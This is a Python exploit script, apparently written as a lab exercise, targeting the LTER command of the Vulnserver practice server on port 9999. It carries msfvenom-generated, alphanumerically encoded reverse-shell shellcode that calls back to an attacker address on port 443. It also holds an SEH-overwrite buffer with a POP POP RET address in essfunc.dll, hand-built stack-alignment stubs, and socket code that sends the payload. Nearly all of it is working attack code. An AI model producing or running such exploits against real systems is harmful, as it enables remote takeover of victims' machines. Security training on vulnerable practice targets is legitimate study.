#!/usr/bin/python3

import socket

host = "10.0.0.192"
port = 9999

# LTER command is also vulnerable to an SEH overwrite at buffer lengths ~3750 and up. Return Address Overwrite is covered in another exploit.
# Bad characters are assumed to be the same as with the return address overwrite, meaning we are limited to characters with hex values between
# \x01 and \x7F

# msfvenom --platform windows -a x86 -p windows/shell_reverse_tcp LHOST=10.0.0.157 LPORT=443 EXITFUNC=thread BufferRegister=EAX -e x86/alpha_mixed -b "\x00" -f python

buf =  b""
buf += b"\x50\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
buf += b"\x49\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30"
buf += b"\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42"
buf += b"\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
buf += b"\x49\x6c\x4b\x58\x6d\x52\x37\x70\x63\x30\x45\x50\x31"
buf += b"\x70\x6b\x39\x79\x75\x44\x71\x59\x50\x51\x74\x4c\x4b"
buf += b"\x46\x30\x76\x50\x4c\x4b\x51\x42\x34\x4c\x6e\x6b\x56"
buf += b"\x32\x62\x34\x4c\x4b\x54\x32\x67\x58\x54\x4f\x78\x37"
buf += b"\x30\x4a\x65\x76\x30\x31\x4b\x4f\x4c\x6c\x57\x4c\x55"
buf += b"\x31\x43\x4c\x57\x72\x74\x6c\x65\x70\x6b\x71\x5a\x6f"
buf += b"\x76\x6d\x37\x71\x48\x47\x7a\x42\x78\x72\x52\x72\x50"
buf += b"\x57\x6e\x6b\x42\x72\x54\x50\x4c\x4b\x70\x4a\x55\x6c"
buf += b"\x4e\x6b\x72\x6c\x44\x51\x53\x48\x6d\x33\x63\x78\x57"
buf += b"\x71\x6b\x61\x36\x31\x6c\x4b\x30\x59\x35\x70\x56\x61"
buf += b"\x5a\x73\x4e\x6b\x30\x49\x47\x68\x4b\x53\x77\x4a\x43"
buf += b"\x79\x6c\x4b\x37\x44\x4e\x6b\x76\x61\x78\x56\x34\x71"
buf += b"\x6b\x4f\x6c\x6c\x5a\x61\x4a\x6f\x74\x4d\x63\x31\x58"
buf += b"\x47\x55\x68\x59\x70\x50\x75\x78\x76\x57\x73\x63\x4d"
buf += b"\x59\x68\x77\x4b\x51\x6d\x37\x54\x53\x45\x68\x64\x70"
buf += b"\x58\x4e\x6b\x30\x58\x45\x74\x43\x31\x59\x43\x70\x66"
buf += b"\x6e\x6b\x36\x6c\x72\x6b\x4e\x6b\x43\x68\x67\x6c\x55"
buf += b"\x51\x38\x53\x6c\x4b\x75\x54\x4c\x4b\x35\x51\x68\x50"
buf += b"\x4e\x69\x62\x64\x37\x54\x34\x64\x51\x4b\x73\x6b\x65"
buf += b"\x31\x33\x69\x63\x6a\x33\x61\x6b\x4f\x4d\x30\x53\x6f"
buf += b"\x51\x4f\x71\x4a\x6e\x6b\x77\x62\x48\x6b\x6e\x6d\x53"
buf += b"\x6d\x42\x48\x37\x43\x34\x72\x45\x50\x65\x50\x35\x38"
buf += b"\x51\x67\x64\x33\x77\x42\x43\x6f\x52\x74\x55\x38\x52"
buf += b"\x6c\x50\x77\x74\x66\x44\x47\x69\x6f\x4a\x75\x6e\x58"
buf += b"\x4e\x70\x76\x61\x77\x70\x67\x70\x64\x69\x78\x44\x53"
buf += b"\x64\x50\x50\x63\x58\x56\x49\x6f\x70\x62\x4b\x43\x30"
buf += b"\x6b\x4f\x38\x55\x72\x70\x32\x70\x70\x50\x42\x70\x73"
buf += b"\x70\x42\x70\x63\x70\x32\x70\x43\x58\x68\x6a\x54\x4f"
buf += b"\x39\x4f\x79\x70\x39\x6f\x6a\x75\x6a\x37\x70\x6a\x65"
buf += b"\x55\x43\x58\x74\x4a\x63\x30\x33\x30\x4d\x4d\x31\x78"
buf += b"\x45\x52\x37\x70\x45\x51\x4f\x4b\x4f\x79\x49\x76\x32"
buf += b"\x4a\x32\x30\x71\x46\x76\x37\x53\x58\x7a\x39\x59\x35"
buf += b"\x51\x64\x53\x51\x49\x6f\x7a\x75\x6c\x45\x39\x50\x44"
buf += b"\x34\x56\x6c\x6b\x4f\x30\x4e\x46\x68\x71\x65\x48\x6c"
buf += b"\x43\x58\x48\x70\x6f\x45\x6f\x52\x31\x46\x59\x6f\x79"
buf += b"\x45\x62\x48\x62\x43\x32\x4d\x43\x54\x77\x70\x6e\x69"
buf += b"\x6a\x43\x33\x67\x42\x77\x50\x57\x74\x71\x49\x66\x42"
buf += b"\x4a\x32\x32\x42\x79\x33\x66\x69\x72\x4b\x4d\x32\x46"
buf += b"\x79\x57\x32\x64\x35\x74\x77\x4c\x65\x51\x37\x71\x6e"
buf += b"\x6d\x33\x74\x76\x44\x56\x70\x68\x46\x43\x30\x70\x44"
buf += b"\x72\x74\x66\x30\x51\x46\x31\x46\x53\x66\x61\x56\x32"
buf += b"\x76\x42\x6e\x32\x76\x73\x66\x56\x33\x33\x66\x55\x38"
buf += b"\x30\x79\x4a\x6c\x67\x4f\x4d\x56\x4b\x4f\x39\x45\x4e"
buf += b"\x69\x39\x70\x50\x4e\x30\x56\x32\x66\x79\x6f\x30\x30"
buf += b"\x52\x48\x57\x78\x4d\x57\x35\x4d\x33\x50\x6b\x4f\x6a"
buf += b"\x75\x6d\x6b\x59\x70\x57\x6d\x76\x4a\x34\x4a\x42\x48"
buf += b"\x6e\x46\x4e\x75\x6f\x4d\x4d\x4d\x6b\x4f\x79\x45\x47"
buf += b"\x4c\x75\x56\x51\x6c\x34\x4a\x6d\x50\x39\x6b\x59\x70"
buf += b"\x42\x55\x46\x65\x6f\x4b\x73\x77\x35\x43\x73\x42\x52"
buf += b"\x4f\x42\x4a\x53\x30\x61\x43\x59\x6f\x6b\x65\x41\x41"

buffer = b"\x66\x35\x0a\x0d\x50\x5C\x66\x2D\x75\x06\x66\x2D\x73\x06" # This is needed before our shellcode to re-align the stack to a safer area, then re-align EAX with shellcode
buffer += buf # placeholder for Stage2 register alignment
buffer += b"\x41" * (3514 - len(buffer))
buffer += b"\x44\x44\x77\x04" # Short jump into Cs. I go here because it's easier to work with these higher memory addresses with EAX and ESP
buffer += b"\x0B\x12\x50\x62" # POP POP RET in essfunc.dll, accounting for bad characters

# This second stage of the payload was very annoying to figure out. Basically I note that EAX holds a value not too far away from the action to be useless.
# I then use EAX and AX math to point ESP at the end of my buffer, then push the hex equivalent of a "JMP EAX" instruction onto the stack, which places it at the
# end of my buffer. I then subtract from EAX to get to the beginning of my As before I hit the JMP EAX to go to the final stage.

buffer += b"\x51\x58\x66\x53\x66\x58\x66\x48\x40\x50\x5C\x66\x2D\x01\x1F\x66\x50\x66\x05\x01\x1F\x48\x66\x2D\x7D\x03\x66\x2D\x7D\x03\x66\x2D\x7D\x03\x66\x2D\x7E\x03"
buffer += b"\x43" * (4000 - len(buffer))

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect = s.connect((host,port))
banner = s.recv(1024)
print(banner.decode())

# Send exploit packet; this will crash the program but grant a reverse shell anyway.

exploit = "LTER /.:/ ".encode() + bytearray(buffer) + "\r\n".encode()

s.send(exploit)
response = s.recv(1024)
print(response.decode())
s.close()
